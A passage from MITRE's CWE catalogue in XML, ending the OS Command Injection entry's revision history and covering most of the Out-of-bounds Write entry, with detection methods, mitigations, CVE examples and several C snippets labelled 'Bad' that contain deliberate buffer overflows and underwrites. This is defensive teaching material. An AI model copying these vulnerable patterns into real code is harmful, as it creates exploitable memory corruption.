               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Detection_Factors, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">OS Command Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Data into an OS Command (aka 'OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve OS Command Structure (aka 'OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Preserve OS Command Structure ('OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in an OS Command ('OS Command Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="787" Name="Out-of-bounds Write" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product writes data past the end, or before the beginning, of the intended buffer.</Description>
         <Extended_Description>Typically, this can result in corruption of data, a crash, or code execution.  The product may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer.  A subsequent write operation then produces undefined or unexpected results.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Often"/>
            <Language Name="C++" Prevalence="Often"/>
            <Language Class="Assembly" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Memory Corruption</Term>
               <Description>Often used to describe the consequences of writing to memory outside the bounds of a buffer, or to memory that is invalid, when the root cause is something other than a sequential copy of excessive data from a fixed starting location. This may include issues such as incorrect pointer arithmetic, accessing invalid pointers due to incomplete initialization or memory release, etc.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Modify Memory</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Detection techniques for buffer-related errors are more mature than for most other weakness types.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Phase>Requirements</Phase>
               <Strategy>Language Selection</Strategy>
               <Description>
                  <xhtml:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.</xhtml:p>
                  <xhtml:p>Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a complete solution, since many buffer overflows are not related to strings.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-10">
              <Phase>Operation</Phase> 
	      <Phase>Build and Compilation</Phase>
	      <Strategy>Environment Hardening</Strategy> 
	      <Description> 
		<xhtml:p>Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. </xhtml:p> 
		<xhtml:p> D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail. </xhtml:p> 

	      </Description> 
	      <Effectiveness>Defense in Depth</Effectiveness> 
	      <Effectiveness_Notes> 
		<xhtml:p> This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application. </xhtml:p> 
	      </Effectiveness_Notes>
	    </Mitigation>
            <Mitigation Mitigation_ID="MIT-9">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Consider adhering to the following rules when allocating and managing an application's memory:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>Double check that the buffer is as large as specified.</xhtml:li>
                        <xhtml:li>When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.</xhtml:li>
                        <xhtml:li>Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.</xhtml:li>
                        <xhtml:li>If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-11">
               <Phase>Operation</Phase> 
	       <Phase>Build and Compilation</Phase> 
	       <Strategy>Environment Hardening</Strategy> 
	       <Description>
		 <xhtml:p>Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. </xhtml:p> 
		 <xhtml:p> Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as "rebasing" (for Windows) and "prelinking" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. </xhtml:p> 
		 <xhtml:p> For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]. </xhtml:p>
	       </Description> 
	       <Effectiveness>Defense in Depth</Effectiveness> 
	       <Effectiveness_Notes>These techniques do not provide a complete solution.  For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]</Effectiveness_Notes> 
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-12">
               <Phase>Operation</Phase> 
	       <Strategy>Environment Hardening</Strategy> 
	       <Description> 
		 <xhtml:p> Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.  </xhtml:p> 
	         <xhtml:p> For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]. </xhtml:p>
	       </Description> 
	       <Effectiveness>Defense in Depth</Effectiveness> 
	       <Effectiveness_Notes>This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application. </Effectiveness_Notes> 
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-13">
               <Phase>Implementation</Phase>
               <Description>Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-15">
               <Intro_Text>The following code attempts to save four different identification numbers into an array.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int id_sequence[3];<xhtml:br/>
                     <xhtml:br/>/* Populate the id array. */<xhtml:br/>
                     <xhtml:br/>id_sequence[0] = 123;<xhtml:br/>id_sequence[1] = 234;<xhtml:br/>id_sequence[2] = 345;<xhtml:br/>id_sequence[3] = 456;</xhtml:div>
               </Example_Code>
	       <Body_Text>Since the array is only allocated to hold three elements, the valid indices are 0 to 2; so, the assignment to id_sequence[3] is out of bounds.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-114">
               <Intro_Text>In the following code, it is possible to request that memcpy move a much larger segment of memory than assumed:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int returnChunkSize(void *) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>/* if chunk info is valid, return the size of usable memory,</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>* else, return -1 to indicate an error</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>*/</xhtml:i>
                           <xhtml:br/>...</xhtml:div>
                     </xhtml:div>}<xhtml:br/>int main() {<xhtml:div style="margin-left:1em;">...<xhtml:br/>memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));<xhtml:br/>...</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787, CWE-788).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This code takes an IP address from the user and verifies that it is well formed. It then looks up the hostname and copies it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>validate_addr_form(user_supplied_addr);<xhtml:br/>addr = inet_addr(user_supplied_addr);<xhtml:br/>hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<xhtml:br/>strcpy(hostname, hp-&gt;h_name);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This function allocates a buffer of 64 bytes to store the hostname. However, there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.</Body_Text>
               <Body_Text>Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-19">
               <Intro_Text>This code applies an encoding procedure to an input string and stores it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char * copy_input(char *user_supplied_string){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>int i, dst_index;<xhtml:br/>char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);<xhtml:br/>if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){<xhtml:div style="margin-left:1em;">die("user string too long, die evil hacker!");</xhtml:div>}<xhtml:br/>dst_index = 0;<xhtml:br/>for ( i = 0; i &lt; strlen(user_supplied_string); i++ ){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if( '&amp;' == user_supplied_string[i] ){<xhtml:div style="margin-left:1em;">dst_buf[dst_index++] = '&amp;';<xhtml:br/>dst_buf[dst_index++] = 'a';<xhtml:br/>dst_buf[dst_index++] = 'm';<xhtml:br/>dst_buf[dst_index++] = 'p';<xhtml:br/>dst_buf[dst_index++] = ';';</xhtml:div>}<xhtml:br/>else if ('&lt;' == user_supplied_string[i] ){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>/* encode to &amp;lt; */</xhtml:i>
                                       <xhtml:br/>
                                    </xhtml:div>
                                 </xhtml:div>}<xhtml:br/>else dst_buf[dst_index++] = user_supplied_string[i];</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return dst_buf;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer attempts to encode the ampersand character in the user-controlled string. However, the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-87">
               <Intro_Text>In the following C/C++ code, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char* trimTrailingWhitespace(char *strMessage, int length) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>char *retMessage;<xhtml:br/>char *message = malloc(sizeof(char)*(length+1));<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// copy input string to a temporary string</xhtml:i>
                           <xhtml:br/>char message[length+1];<xhtml:br/>int index;<xhtml:br/>for (index = 0; index &lt; length; index++) {<xhtml:div style="margin-left:1em;">message[index] = strMessage[index];</xhtml:div>}<xhtml:br/>message[index] = '\0';<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// trim trailing whitespace</xhtml:i>
                           <xhtml:br/>int len = index-1;<xhtml:br/>while (isspace(message[len])) {<xhtml:div style="margin-left:1em;">message[len] = '\0';<xhtml:br/>len--;</xhtml:div>}<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// return string without trailing whitespace</xhtml:i>
                           <xhtml:br/>retMessage = message;<xhtml:br/>return retMessage;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-20">
               <Intro_Text>The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int i;<xhtml:br/>unsigned int numWidgets;<xhtml:br/>Widget **WidgetList;<xhtml:br/>
                     <xhtml:br/>numWidgets = GetUntrustedSizeValue();<xhtml:br/>if ((numWidgets == 0) || (numWidgets &gt; MAX_NUM_WIDGETS)) {<xhtml:div style="margin-left:1em;">ExitError("Incorrect number of widgets requested!");</xhtml:div>}<xhtml:br/>WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));<xhtml:br/>printf("WidgetList ptr=%p\n", WidgetList);<xhtml:br/>for(i=0; i&lt;numWidgets; i++) {<xhtml:div style="margin-left:1em;">WidgetList[i] = InitializeWidget();</xhtml:div>}<xhtml:br/>WidgetList[numWidgets] = NULL;<xhtml:br/>showWidgets(WidgetList);</xhtml:div>
               </Example_Code>
               <Body_Text>However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-88">
               <Intro_Text>The following is an example of code that may result in a buffer underwrite. This code is attempting to replace the substring "Replace Me" in destBuf with the string stored in srcBuf. It does so by using the function strstr(), which returns a pointer to the found substring in destBuf.  Using pointer arithmetic, the starting index of the substring is found.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int main() {
                     <xhtml:div style="margin-left:1em;">...<xhtml:br/>
                     char *result = strstr(destBuf, "Replace Me");<xhtml:br/>
                     int idx = result - destBuf;<xhtml:br/>
                     strcpy(&amp;destBuf[idx], srcBuf);<xhtml:br/>
                     ...</xhtml:div>}
                  </xhtml:div>
               </Example_Code>
               <Body_Text>In the case where the substring is not found in destBuf, strstr() will return NULL, causing the pointer arithmetic to be undefined, potentially setting the value of idx to a negative number.  If idx is negative, this will result in a buffer underwrite of destBuf.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-21220</Reference>
               <Description>Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21220</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-28664</Reference>
               <Description>GPU kernel driver allows memory corruption because a user can obtain read/write access to read-only pages, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-28664</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-17087</Reference>
               <Description>Chain: integer truncation (CWE-197) causes small buffer allocation (CWE-131) leading to out-of-bounds write (CWE-787) in kernel pool, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-17087</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-1054</Reference>
               <Description>Out-of-bounds write in kernel-mode driver, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-1054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0041</Reference>
               <Description>Escape from browser sandbox using out-of-bounds write due to incorrect bounds check, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0041</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0968</Reference>
               <Description>Memory corruption in web browser scripting engine, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0968</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0022</Reference>
               <Description>chain: mobile phone Bluetooth implementation does not include offset when calculating packet length (CWE-682), leading to out-of-bounds write (CWE-787)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0022</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-1010006</Reference>
               <Description>Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-1010006</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1532</Reference>
               <Description>malformed inputs cause accesses of uninitialized or previously-deleted objects, leading to memory corruption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1532</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0269</Reference>
               <Description>chain: -1 value from a function call was intended to indicate an error, but is used as an array index instead.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0269</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-2227</Reference>
               <Description>Unchecked length of SSLv2 challenge value leads to buffer underflow.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-2227</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4580</Reference>
               <Description>Buffer underflow from a small size value with a large buffer (length parameter inconsistency, CWE-130)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4580</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4268</Reference>
               <Description>Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4268</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2550</Reference>
               <Description>Classic stack-based buffer overflow in media player using a long entry in a playlist</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2550</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2403</Reference>
               <Description>Heap-based buffer overflow in media player using a long entry in a playlist</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2403</Link>
            </Observed_Example>
         </Observed_Examples>
	 <Taxonomy_Mappings>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 3-3</Entry_ID>
	     <Entry_Name>Req SR 3.5</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
